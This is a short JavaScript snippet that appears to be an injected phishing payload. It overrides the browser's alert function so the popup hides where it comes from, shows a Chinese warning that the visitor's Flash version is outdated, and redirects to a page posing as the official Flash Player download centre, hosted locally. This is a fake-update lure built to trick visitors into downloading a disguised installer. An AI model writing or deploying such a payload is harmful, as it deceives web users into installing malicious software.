window.alert = function (name){
    var iframe = document.createElement("IFRAME");
    iframe.style.display="none";
    iframe.setAttribute("src", "data:text/plain,");
    document.documentElement.appendChild(iframe);
    window.frames[0].window.alert(name);
    iframe.parentNode.removeChild(iframe);
}
alert('您的 FLASH 版本过低，尝试升级后访问该页面！');
window.location.href="http://127.0.0.1:8888/Flash Player官方下载中心.html";


